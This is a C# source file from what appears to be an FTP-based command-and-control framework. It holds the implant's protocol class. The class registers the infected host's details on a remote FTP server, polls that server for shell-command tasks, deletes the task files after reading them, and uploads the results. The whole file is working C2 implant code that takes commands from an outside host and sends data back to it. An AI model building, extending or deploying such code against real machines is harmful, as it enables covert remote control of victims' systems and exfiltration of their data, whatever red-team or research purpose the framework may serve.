using FtpC2.Responses;
using FtpC2.Tasks;
using System.Net.Http.Json;
using System.Text.Json;
using System.Text.Json.Serialization;

namespace FtpAgent
{
    internal class AgentProtocol
    {
        private readonly FtpHelper? FTP;

        public AgentProtocol(string host, string username, string password, bool secure, Guid agentSession)
        {
            this.FTP = new(host, username, password, secure, agentSession);
        }

        public void RegisterOrUpdateAgent()
        {
            if (this.FTP == null)
                return;

            Agent agent = new();

            agent.Refresh(this.FTP.Session);

            string jsonAgent = JsonSerializer.Serialize(agent);

            this.FTP.UploadString(jsonAgent, Shared.PlaceHolders.AgentInformation);
        }

        public List<TaskWrapper> EnumerateTasks()
        {
            List<TaskWrapper> tasks = new();
            if (this.FTP == null)
                return tasks;

            List<string> files = this.FTP.ListDirectory();

            string taskSessionCandidate = "";

            foreach (string file in files)
            {
                if (!file.StartsWith(Shared.PlaceHolders.TaskRequest))
                    continue;

                taskSessionCandidate = file.Substring(Shared.PlaceHolders.TaskRequest.Length + 1 /* +1 to ignore the dot */);                

                if (!Guid.TryParse(taskSessionCandidate, out Guid taskSession))
                    continue;                

                try
                {
                    // Download task content
                    string jsonData = this.FTP.DownloadString(file);

                    TaskWrapper? wrappedTask = JsonSerializer.Deserialize<TaskWrapper>(jsonData);
                    TaskWrapper? task = null;

                    if (wrappedTask != null && wrappedTask.Id == taskSession)
                    {
                        switch(wrappedTask.TaskType)
                        {
                            case "TaskShellCommand":
                            {
                                    TaskShellCommand? unwrappedTask = JsonSerializer.Deserialize<TaskShellCommand>(jsonData);
                                    if (unwrappedTask != null)
                                        task = unwrappedTask;

                                    break;
                            }

                            case "TaskCommand":
                                {
                                    TaskCommand? unwrappedTask = JsonSerializer.Deserialize<TaskCommand>(jsonData);
                                    if (unwrappedTask != null)
                                        task = unwrappedTask;

                                    break;
                                }

                            // Add your additional task classes here
                            // ...
                        }

                        if (task != null)
                            tasks.Add(task);
                    }                    
                }
                catch
                {
                    // Any potential exceptions are intentionally ignored to guarantee the deletion
                    // of the task file. This precautionary measure prevents the persistence of a
                    // possibly corrupted task file on the remote server, which could adversely affect
                    // operations.                    
                }

                try
                {
                    // Before registering the new task, it is mandatory to remove the existing
                    // task request file from the remote server. This prerequisite step 
                    // ensures smooth creation and operation of the new task.
                    this.FTP.DeleteFile(file);
                }
                catch
                {
                    continue;
                }                
            }           

            return tasks;
        }

        public void RegisterNewResponse(ResponseWrapper response, Guid taskId)
        {
            if (this.FTP == null)
                return;

            response.TaskId = taskId;
            response.AgentId = this.FTP.Session ?? Guid.Empty;
            response.DateTime = DateTime.Now;
            response.ResponseType = response.GetType().Name;

            string jsonData = JsonSerializer.Serialize(response, response.GetType());

            this.FTP.UploadString(jsonData, $"{Shared.PlaceHolders.ResponseRequest}.{taskId}");
        }

    }
}
